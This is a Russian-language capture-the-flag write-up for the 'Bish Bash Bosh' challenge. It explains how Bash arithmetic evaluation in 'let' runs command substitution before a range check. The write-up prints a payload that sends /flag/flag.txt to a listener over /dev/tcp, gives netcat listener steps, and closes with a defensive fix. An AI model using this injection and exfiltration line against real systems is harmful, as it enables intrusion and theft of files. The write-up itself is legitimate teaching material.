# Bish Bash Bosh: подстановка команды до проверки диапазона

[English](solve.md)

## 0. Условие

Блокнот Bash с меню: выбрать номер 0–2, получить один из трёх файлов с текстом. В ZIP есть `server.sh`, `entrypoint.sh`, Dockerfile, compose и сохранённые команды. Флаг находится в `/flag/flag.txt`.

Ошибка в последовательности: пользовательскую строку сначала отдают **арифметическому парсеру Bash**, а уже потом проверяют диапазон.

## 1. Исходник

```bash
files=(
  "/flag/flag.txt"
  "msg1"
  "msg2"
  "msg3"
)

echo "What message would you like to see? (0..2)"
read -r i
let i=$i-1

if (( i < 1 || i > 3 )); then
  echo "Nuh uh"
  exit 1
fi

file="\${files[i]}"
cat -- "$file"
```

Номинально доступны `files[1]`, `files[2]`, `files[3]`. `files[0]` — флаг, но просто отправить `0` не поможет: после `let` получается `-1`, которое отсекает `if`. Необычный текст тоже не обязан превращаться в допустимое число.

Нужно обратить внимание на строку `let i=$i-1`: сюда попадает не «целое число», а **выражение**, которое Bash будет разбирать с учётом переменных, массивов и подстановок команд.

## 2. Что было отправлено на самом деле

В сохранённом `evidence/solve_*.txt` есть payload:

```bash
x[$(cat /flag/flag.txt > /dev/tcp/<listener>/4444)]
```

Внутри индекса массива стоит `$(...)`. При вычислении арифметического выражения Bash способен выполнить эту подстановку, и содержимое `/flag/flag.txt` перенаправляется на TCP-порт слушателя. Значение индекса и результат проверки позже **не важны**: побочный эффект уже произошёл.

Здесь не нужно заставлять `files[i]` обратиться к нулевому элементу. Эксплуатация происходит раньше, во время парсинга `let`.

## 3. Воспроизводимый порядок

1. На доступном из CTF контейнера адресе запустить `nc -lvnp 4444`.
2. Подключиться к TCP-сервису и дождаться `What message would you like to see? (0..2)`.
3. Отправить строку payload с адресом слушателя вместо `<listener>`.
4. Посмотреть данные, пришедшие на слушатель.
5. Отправить найденный флаг платформе. Возможный вывод `Nuh uh` после выполнения выражения не отменяет отправку файла.

В репозитории адрес слушателя и сам флаг скрыты. Формула payload и назначение файлов взяты непосредственно из исходника и сохранённых команд.

## 4. Почему проверка не защищает

Проверка `i<1 || i>3` выполняется **после** вычисления недоверенного `i`. Для Bash арифметические выражения — не пассивная конвертация строки в integer. Они могут содержать вложенные конструкции с действиями вне самой проверки диапазона.

Это ошибка уровня интерпретатора, а не «разрешённый индекс -1».

## 5. Защита

Проверять, что вход — ровно строка `0`, `1` или `2`, **до** любых арифметических вычислений. Для трёх вариантов проще использовать `case` без `let` и без вычисления произвольных пользовательских выражений. Логи полного интерактивного сеанса не сохранились, но `server.sh` и команда эксплуатации находятся в архиве.


## Локальное окружение

Оригинальные [`Dockerfile`](assets/Dockerfile), [`compose.yml`](assets/compose.yml), [`server.sh`](assets/server.sh) и [`entrypoint.sh`](assets/entrypoint.sh) сохранены вместе. Для запуска из каталога `ctf/platypwn2026/misc/bishbashbosh/assets` используется `docker compose up --build`, порт `9000`. В Compose прописан **демонстрационный**, не настоящий флаг. Комментарий к `compose.yml` отдельно объясняет несовместимость функции `configs` с некоторыми версиями podman-compose. Сборка в рамках аудита не запускалась.
